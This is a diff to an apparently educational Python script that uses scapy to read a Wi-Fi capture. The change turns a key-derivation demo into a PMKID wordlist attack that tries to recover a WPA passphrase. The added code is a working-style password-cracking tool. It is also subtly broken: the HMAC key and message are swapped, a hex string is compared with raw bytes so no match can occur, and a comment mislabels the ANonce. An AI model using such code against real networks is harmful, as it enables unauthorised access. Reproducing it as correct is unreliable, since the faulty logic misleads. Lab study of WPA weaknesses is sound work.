@@ -19,6 +19,8 @@ __status__ = "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
+
+from scapy.contrib.wpa_eapol import WPA_key
 from scapy.layers.dot11 import *
 
 from pbkdf2 import *
@@ -64,8 +66,24 @@ def getAssociationRequestInfo(packets):
     APmac = a2b_hex(pkt.addr1.replace(':', ''))
     # addr2 is where the MAC of the client is stored in the first association request in our case
     Clientmac = a2b_hex(pkt.addr2.replace(':', ''))
-    print(pkt)
-    return ssid, APmac, Clientmac
+    return ssid, APmac
+
+def getHandshakeInfo(packets):
+    """
+    Will get all useful values from the 4 way handshake packets.
+    Handshake packets must be in order.
+    :param packets: the list of packets
+    :return: the authenticator nonce, the supplicant nonce, the mic of the fourth message and the data of the fourth message
+    """
+    # Search for all the packets that have the layer WPA_key (This will return the 4 way handshake packets)
+    pkts = list(filter(lambda pkt: pkt.haslayer(WPA_key), packets))
+    Clientmac = a2b_hex(pkts[1].addr1.replace(':', ''))
+    # Get the WPA_layer of the packets found contains the value of the handshake
+    handshakePkts = list(map(lambda pkt: pkt.getlayer(WPA_key), pkts))
+    # Authenticator and Supplicant Nonces
+    pmkid = (b2a_hex(handshakePkts[1].wpa_key).decode('UTF-8'))[12:]  # ANonce in first message of the handshake
+
+    return pmkid, Clientmac
 
 def main():
     # Read capture file -- it contains beacon, authentication, association, handshake and data
@@ -75,7 +93,9 @@ def main():
     passPhrase = "admin123"
 
     # Important parameters for key derivation - most of them can be obtained from the pcap file
-    ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
+    ssid, APmac = getAssociationRequestInfo(wpa)
+    pmkid, Clientmac = getHandshakeInfo(wpa)
+    pmk_name = b"PMK Name"  # this string is used in the pseudo-random function
 
     print("\n\nValues used to derivate keys")
     print("============================")
@@ -83,11 +103,26 @@ def main():
     print("SSID: ", ssid, "\n")
     print("AP Mac: ", b2a_hex(APmac), "\n")
     print("CLient Mac: ", b2a_hex(Clientmac), "\n")
+    print("PMKID: ", pmkid, "\n")
 
-    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-    passPhrase = str.encode(passPhrase)
     ssid = str.encode(ssid)
-    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+
+    print("\nTrying to find passphrase")
+    print("============================")
+    # Read from the wordlist
+    f = open('./wordlist.txt', 'r')
+    # Read each line of the file. The line read will be the passphrase to test
+    for passPhrase in f.read().splitlines():
+        print(passPhrase)
+        # Encode the passphrase and the ssid as bytes
+        passPhrase = str.encode(passPhrase)
+        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+        pmkid_test = hmac.new(pmk_name + APmac + Clientmac, pmk, hashlib.sha1)
+        print(pmkid_test.hexdigest())
+        if pmkid == pmkid_test.digest():
+            print(passPhrase)
+
 
 if __name__ == "__main__":
     main()
